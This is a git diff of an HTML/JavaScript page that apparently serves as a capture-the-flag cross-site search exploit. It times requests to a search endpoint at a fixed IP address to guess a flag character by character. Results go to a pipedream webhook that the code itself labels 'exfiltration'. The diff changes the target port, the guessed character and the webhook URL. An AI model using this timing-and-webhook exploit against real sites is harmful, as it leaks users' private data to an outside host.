@@ -4,18 +4,18 @@
             function runTest(param) {
 
                  // Create and append the image element for the 1.jpg image
-                var img = document.createElement('img');
-                img.style.display = 'block';  // Ensure the image is displayed
-                img.src = 'http://125.138.133.213:44444/static/images/1.jpg';  // Image URL
-                document.body.appendChild(img);  // Append the image to the body
+                //var img = document.createElement('img');
+                //img.style.display = 'block';  // Ensure the image is displayed
+                //img.src = 'http://125.138.133.213:44444/static/images/1.jpg';  // Image URL
+                //document.body.appendChild(img);  // Append the image to the body
                 // Wait for the iframe to load (~500ms)
                 setTimeout(() => {
 
                     // URL to load for the flag
-                    var url_to_load = 'http://125.138.133.213:44444/search?query=f';
+                    var url_to_load = 'http://125.138.133.213:44445/search?query=Y';
 
                     // Webhook URL to report (exfiltration)
-                    var wh_url = 'https://eo92jpwn05w7j5i.m.pipedream.net';
+                    var wh_url = 'https://eo3eo8lgn63ufrc.m.pipedream.net';
 
                     var start = window.performance.now();
 
@@ -43,7 +43,7 @@
     <body>
         <!-- Changed hash - non-flag string -->
         <script>
-            runTest("no flag");
+            runTest("Y");
         </script>
     </body>
 </html>
